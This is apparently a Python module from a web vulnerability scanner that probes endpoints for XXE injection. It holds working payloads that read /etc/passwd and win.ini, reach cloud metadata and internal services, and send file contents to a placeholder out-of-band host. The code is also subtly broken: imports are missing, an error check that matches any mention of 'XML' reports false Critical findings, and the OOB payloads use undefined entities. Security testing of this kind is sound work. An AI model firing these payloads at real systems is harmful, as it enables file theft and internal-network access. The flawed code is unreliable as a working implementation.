# scanner/dast/modules/xxe_module.py
#
# ENHANCED XXE (XML External Entity) MODULE
# Tests all XML-accepting endpoints for XXE, blind XXE, and XXE-via-file-upload.

import asyncio
import logging
import re
import base64
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urlparse
import httpx

logger = logging.getLogger(__name__)

# Default configuration
DEFAULT_CONFIG = {
    "xxe_payloads_per_endpoint": 15,
    "request_timeout": 20,
    "concurrent_requests": 3,
    "oast_domain": None,  # Out-of-band domain for blind XXE
    "min_response_length": 10,
    "confidence_threshold": 0.7,
}

# Enhanced XXE payloads
XXE_PAYLOADS = [
    # Classic file read
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<root><data>&xxe;</data></root>',
        ["root:x:", "root:0:0", "daemon:", "nobody:", "bin/bash"],
        "File read via XXE",
        "inband"
    ),
    # Windows file read
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
        '<root><data>&xxe;</data></root>',
        ["[fonts]", "[extensions]", "for 16-bit", "[files]"],
        "Windows file read via XXE",
        "inband"
    ),
    # Directory listing
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/">]>'
        '<root><data>&xxe;</data></root>',
        ["passwd", "shadow", "hosts", "group"],
        "Directory listing via XXE",
        "inband"
    ),
    # SSRF to cloud metadata
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
        '<root><data>&xxe;</data></root>',
        ["ami-id", "instance-id", "local-ipv4", "hostname", "public-keys"],
        "SSRF to AWS metadata via XXE",
        "inband"
    ),
    # SSRF to internal services
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]>'
        '<root><data>&xxe;</data></root>',
        ["tomcat", "jetty", "nginx", "apache"],
        "SSRF to internal service via XXE",
        "inband"
    ),
    # PHP filter bypass
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"php://filter/convert.base64-encode/resource=index.php">]>'
        '<root><data>&xxe;</data></root>',
        ["PD9waHA", "<?php", "base64"],
        "PHP source disclosure via XXE",
        "inband"
    ),
    # Parameter entity attack
    (
        '<?xml version="1.0"?><!DOCTYPE foo ['
        '<!ENTITY % remote SYSTEM "http://{domain}/xxe.dtd">'
        '%remote;%int;%trick;]>'
        '<root></root>',
        [],
        "Parameter entity XXE",
        "oob"
    ),
    # Out-of-band data exfiltration
    (
        '<?xml version="1.0"?><!DOCTYPE foo ['
        '<!ENTITY % remote SYSTEM "http://{domain}/xxe.dtd">'
        '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
        "'http://{domain}/collect?data=%file;'>\">"
        '%eval;%exfil;]>'
        '<root></root>',
        [],
        "Out-of-band data exfiltration",
        "oob"
    ),
]

# XML content types with variations
XML_CONTENT_TYPES = [
    "text/xml",
    "application/xml",
    "application/soap+xml",
    "application/rss+xml",
    "application/xhtml+xml",
    "image/svg+xml",
    "application/atom+xml",
    "text/xml; charset=utf-8",
    "application/xml; charset=utf-8",
    "text/xml; charset=iso-8859-1",
]

# File upload content types for XXE via file upload
FILE_UPLOAD_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "image/svg+xml",
    "application/xhtml+xml",
]

class XXEModule:
    def __init__(self, scanner, config: Optional[Dict] = None):
        self.scanner = scanner
        self.config = {**DEFAULT_CONFIG, **(config or {})}
        self.rate_limiter = asyncio.Semaphore(self.config["concurrent_requests"])

    async def run(self, client: httpx.AsyncClient, url: str, params: List[str]) -> None:
        """Run comprehensive XXE testing"""
        try:
            tasks = [
                self.test_xxe_post(client, url),
                self.test_xxe_get(client, url, params),
                self.test_xxe_file_upload(client, url),
                self.test_xxe_blind(client, url),
            ]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Log any exceptions
            for result in results:
                if isinstance(result, Exception):
                    logger.error(f"XXE test failed: {result}")
                    
        except Exception as e:
            logger.error(f"XXE module failed for {url}: {e}")

    # ── POST-based XXE Testing ────────────────────────────────────────────────
    async def test_xxe_post(self, client: httpx.AsyncClient, url: str) -> None:
        """Test XXE via POST requests with various content types"""
        try:
            for content_type in XML_CONTENT_TYPES:
                for payload, indicators, description, payload_type in XXE_PAYLOADS:
                    if payload_type != "inband":
                        continue
                        
                    # Skip OOB payloads if no domain configured
                    if "{domain}" in payload and not self.config["oast_domain"]:
                        continue
                        
                    final_payload = payload
                    if "{domain}" in payload and self.config["oast_domain"]:
                        final_payload = payload.replace("{domain}", self.config["oast_domain"])
                    
                    if await self._test_xxe_payload(client, url, final_payload, content_type, indicators, description):
                        return  # Stop after first detection
                        
        except Exception as e:
            logger.error(f"POST XXE test failed for {url}: {e}")

    # ── GET-based XXE Testing ─────────────────────────────────────────────────
    async def test_xxe_get(self, client: httpx.AsyncClient, url: str, params: List[str]) -> None:
        """Test XXE via GET parameters (less common but possible)"""
        try:
            for param in params:
                # Look for parameters that might accept XML
                if any(xml_keyword in param.lower() for xml_keyword in ["xml", "data", "input", "request"]):
                    for payload, indicators, description, payload_type in XXE_PAYLOADS:
                        if payload_type != "inband":
                            continue
                            
                        test_url = self._inject_param(url, param, payload)
                        response = await self._safe_request(client, "GET", test_url)
                        
                        if response and self._detect_xxe_indicators(response.text, indicators):
                            self._report_xxe(url, param, payload, description, response, "GET")
                            return
                            
        except Exception as e:
            logger.error(f"GET XXE test failed for {url}: {e}")

    # ── File Upload XXE Testing ───────────────────────────────────────────────
    async def test_xxe_file_upload(self, client: httpx.AsyncClient, url: str) -> None:
        """Test XXE via file upload functionality"""
        try:
            # Check if endpoint might accept file uploads
            if not self._is_upload_endpoint(url):
                return
                
            for content_type in FILE_UPLOAD_CONTENT_TYPES:
                for payload, indicators, description, payload_type in XXE_PAYLOADS:
                    if payload_type != "inband":
                        continue
                        
                    # Test as file upload
                    files = {
                        "file": ("test.xml", payload, content_type)
                    }
                    
                    response = await self._safe_request(
                        client, "POST", url,
                        files=files,
                        timeout=self.config["request_timeout"]
                    )
                    
                    if response and self._detect_xxe_indicators(response.text, indicators):
                        self._report_xxe(url, "file", payload, description, response, "file upload")
                        return
                        
        except Exception as e:
            logger.error(f"File upload XXE test failed for {url}: {e}")

    # ── Blind XXE Testing ─────────────────────────────────────────────────────
    async def test_xxe_blind(self, client: httpx.AsyncClient, url: str) -> None:
        """Test for blind XXE using out-of-band techniques"""
        try:
            if not self.config["oast_domain"]:
                return  # Skip if no OAST domain configured
                
            for content_type in XML_CONTENT_TYPES:
                for payload, indicators, description, payload_type in XXE_PAYLOADS:
                    if payload_type != "oob":
                        continue
                        
                    final_payload = payload.replace("{domain}", self.config["oast_domain"])
                    
                    # Send the blind XXE payload
                    await self._safe_request(
                        client, "POST", url,
                        content=final_payload,
                        headers={"Content-Type": content_type},
                        timeout=self.config["request_timeout"]
                    )
                    
                    # Note: Detection would happen via OAST callbacks
                    # This would require integration with an OAST service
                    
        except Exception as e:
            logger.error(f"Blind XXE test failed for {url}: {e}")

    # ── Core XXE Testing Method ───────────────────────────────────────────────
    async def _test_xxe_payload(self, client: httpx.AsyncClient, url: str, payload: str, 
                              content_type: str, indicators: List[str], description: str) -> bool:
        """Test a specific XXE payload"""
        response = await self._safe_request(
            client, "POST", url,
            content=payload,
            headers={"Content-Type": content_type},
            timeout=self.config["request_timeout"]
        )
        
        if not response or response.status_code in (404, 415, 405, 400):
            return False
            
        if self._detect_xxe_indicators(response.text, indicators):
            self._report_xxe(url, "request_body", payload, description, response, "POST")
            return True
            
        # Check for error-based indicators
        if self._detect_xxe_errors(response.text):
            self._report_xxe(url, "request_body", payload, "Error-based XXE", response, "POST")
            return True
            
        return False

    def _detect_xxe_indicators(self, response_text: str, indicators: List[str]) -> bool:
        """Detect XXE indicators in response text"""
        if not response_text or len(response_text) < self.config["min_response_length"]:
            return False
            
        text_lower = response_text.lower()
        
        for indicator in indicators:
            if indicator.lower() in text_lower:
                return True
                
        # Check for base64 encoded PHP
        if "PD9waHA" in response_text or "PD9waHA" in response_text.replace(" ", "").replace("\n", ""):
            return True
            
        return False

    def _detect_xxe_errors(self, response_text: str) -> bool:
        """Detect XXE-related error messages"""
        error_patterns = [
            r"XML", "Entity", "DOCTYPE", "SYSTEM", "PUBLIC",
            "entity reference", "unparsed entity", "external entity",
            "xmlParseEntityRef", "xmlParseExternalEntity",
            "Access is denied", "Permission denied",
            "file not found", "no such file",
        ]
        
        text_lower = response_text.lower()
        return any(pattern.lower() in text_lower for pattern in error_patterns)

    def _is_upload_endpoint(self, url: str) -> bool:
        """Check if URL might be a file upload endpoint"""
        upload_keywords = [
            "upload", "import", "submit", "attach", "file",
            "document", "image", "media", "content",
        ]
        
        path = urlparse(url).path.lower()
        return any(keyword in path for keyword in upload_keywords)

    # ── Utility Methods ───────────────────────────────────────────────────────
    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject parameter value into URL"""
        parsed = urlparse(url)
        query_dict = parse_qs(parsed.query, keep_blank_values=True)
        query_dict[param] = [value]
        new_query = urlencode(query_dict, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    async def _safe_request(self, client: httpx.AsyncClient, method: str, url: str, 
                          **kwargs) -> Optional[httpx.Response]:
        """Make a safe HTTP request with timeout and error handling"""
        async with self.rate_limiter:
            try:
                kwargs.setdefault("timeout", self.config["request_timeout"])
                return await self.scanner._req(client, method, url, **kwargs)
            except Exception as e:
                logger.debug(f"Request failed: {method} {url}: {e}")
                return None

    # ── Reporting Methods ─────────────────────────────────────────────────────
    def _report_xxe(self, url: str, param: str, payload: str, description: str, 
                   response: httpx.Response, method: str) -> None:
        """Report XXE finding"""
        evidence = f"XXE detected via {method} - HTTP {response.status_code}"
        if response.text:
            # Extract relevant part of response
            sample = response.text[:200].replace('\n', ' ').replace('\r', ' ')
            evidence += f" - Response: {sample}..."
        
        self.scanner._add_finding({
            "type": "XML External Entity (XXE) Injection",
            "subtype": description,
            "url": url,
            "parameter": param,
            "payload": payload[:150] + "..." if len(payload) > 150 else payload,
            "severity": "Critical",
            "confidence": 0.95,
            "evidence": evidence,
            "description": (
                f"Endpoint vulnerable to XML External Entity processing. "
                f"{description}. "
                f"Attackers can read arbitrary files, perform SSRF attacks, "
                f"or access internal resources."
            ),
        })
